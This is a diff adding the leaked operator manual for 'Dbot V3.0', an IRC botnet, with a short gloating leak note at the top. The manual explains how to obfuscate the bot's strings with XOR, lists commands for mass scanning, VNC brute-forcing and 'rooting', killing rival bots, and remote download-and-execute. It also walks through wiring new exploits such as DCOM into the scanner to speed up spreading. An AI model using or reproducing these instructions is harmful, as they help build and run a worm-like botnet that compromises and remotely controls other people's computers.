@@ -1,0 +1,160 @@
+w00ps i leaked this :( sorry :DDDDDDDD lolz
+sorry for anyone that paid $$$ all i can say is make sure your using a SECURE FTP!
+OR YOU BETTER CHECK ON YOUR FILE A LOT BECAUSE PEOPLE WILL REPLACE IT WITH THIERS :P
+dun dun dun ..... pz
+
+
+
+
+MIGHT WANNA EDIT THE VNCPS.cpp file and add or remove some passwords :D and what nots
+
+
+.bk -s 60
+.patch -s 
+.setcftp IP PORT USER PASS FILE.EXE -s
+.scan 64 1 y 2 2 201.x.x.x -s
+.h download file 1
+.h remove
+
+		Dbot V3.0 by D
+		Copyright (c) 2007
+******************************************************
+Manuals - READ BEFORE USING THE BOT!
+******************************************************
+
+TABLE OF CONTENTS
+1. Preparations before compiling
+2. Using XOR encoder
+3. Bot commands
+4. Adding exploits
+
+
+
+1. Preparations before compiling
+--------------------------------
+
+You need to edit config.h. Where MD5 hashes are requerd, you need
+to put in MD5 hash, else it won't work. Use MD5ChecksumTest.exe
+to generate MD5 hash of certain string. When calling command that
+is hashed (download & remove), always use h as char right after 
+command prefix (eg. !h download... or .h download...). If you wish 
+you can also change irc strings, bot version, autostart description, 
+registry location, etc... How to change that, read section 2.
+
+
+2. Using XOR encoder
+--------------------
+
+Open strings.h. You can see there strings being encoded with XORing
+depending on char decode_key[], which is also in this file. Xor.exe
+is a command line program that can out of one file generate strings.h
+file, where encoded strings are then located. 
+
+Check strings.cfg and strings.h for example and compare them.
+*Note1: always save old strings.h before making new one
+*Note2: xor.exe does not write Decode function into strings.h, so
+i recommend you to generate new .h file called strings_temp.h for
+example and then just copy out string chars into strings.h (dont forget
+to copy char decode_key[] and BOOL decode_comp too.
+
+If your bot isnt working anymore, after you change strings (either
+doesnt connect to irc or doesnt run after reboot, you have fucked up
+something with strings).
+
+
+3. Bot commands
+---------------
+
+Standard non-protected commands (assuming prefix = !):
+() == needed parameter, [] == optional parameter
+
+!v			bot version
+!d			disconnect
+!r			reconnect to same server
+!q 			reconnect to next server
+!n [nick]		change nick [to nick]
+!restart		restarts the bot (this is not reconnect)
+!scanstop		stop scanning
+!patch			patch win xp sp2 tcpip.sys (report to techchannel)
+!total			total transfers via bots ftpd
+!vnc			report own vnc server status (to techchannel)
+!getcftp		get current cftp settings
+!j (#chan)		join #chan
+!p (#chan)		part #chan
+!bk (x)			start botkiller, repeat every x minutes 
+			(if x == off, bk is turned off)
+!setcftp (host) (port) (user) (pass) (file)	change cftp settings
+
+Scanning command:
+!scan (threads) (rand/seq) (ip/b/y) (vnc mode) (transfer mode) [lanbots range]
+
+threads = number of threads (recommended 64, not go over 96)
+rand/seq = 1 means random, 0 means sequential scanning
+ip/b/y = put in IP to start scan from or b for C&D IP range scanning (own)
+	 or y for B random IP range scanning (own)
+vnc mode = 0 - no vnc scan,
+	   1 - with vnc scan,
+	   2 - with vnc scan and rooting,
+	   3 - vnc scan only
+transfer mode = 0 - all bots use ftp
+		1 - lan bots use cftp, wan bots use ftp
+		2 - all use cftp
+lanbots range = range (in form of 127.0.x.x) for lanbots to scan (so they dont
+		scan lan ranges which are mostly empty)
+
+Recomendations: I recommend you to use cftp for lan bots and reach much higher
+spread rate (usually with other bots, lan bots are there just for jack). But be
+careful, when using vnc rooting and cftp, location of your exe can be easily
+obtained by masters of pcs you are rooting!
+
+Protected commands (download):
+!h <custom-check-config> (URL) [destination] (mode)
+
+custom-check-config = your string for download, which you protected with md5
+URL = url to download from (must start with http:// or ftp://)
+destination = optional destination place to copy bot to, but dont need to be used
+	      (then the bot downloads .exe into temp folder)
+mode = 0 - just download
+       1 - download and run
+       2 - download, run and remove me
+
+Protected commands (remove):
+!h <custom-check-config>
+
+custom-check-config = your string for removal, which you protected with md5
+
+4. Adding exploits
+------------------
+
+Adding exploits to this bot is a bit more complicated. Each scanning thread is
+designed to check for all ports which are needed for exploitation. Thats why
+each scan is actually already mass scan for best spreading when using multiple
+exploits. 
+
+To add exploit, you need to put in new .cpp and .h files with containing
+exploit. 
+
+Then open include.h and add "#include "yourexploit.h"". 
+
+Then it comes to editing scanner. Open scanner.cpp and find 
+"DWORD WINAPI ScanThread(LPVOID param)".
+There is variable "BOOL Port5900;". Add your own bool variable (eg. adding dcom, 
+add: "Port135"), so it looks like: "BOOL Port5900, Port135;".
+
+Right after "while (1) {", add "Port135 = FALSE;".
+
+Locate "Port5900 = AdvPortOpen(Thread[scan.ThreadNum].Sock, CurrentIP, 5900);"
+and add below: "Port135 = AdvPortOpen(Thread[scan.ThreadNum].Sock, CurrentIP, 135);"
+
+Then just add:
+"if (Port135)
+	DCOMExploit(parameters);"
+
+This requers some basic knowledge of C; i cant tell you for parameters as that
+depends on what sploit you have, but its not hard if you try :)
+
+Tip: There are some exploits that run on same ports (ASN & netapi); usual bot
+would double check same port, which is kinda stupid. This method checks port only
+once, and then depending on open ports run exploit. If you have more exploits
+running on same port, this bot can quite speed up spreading even with using
+same amount of threads!
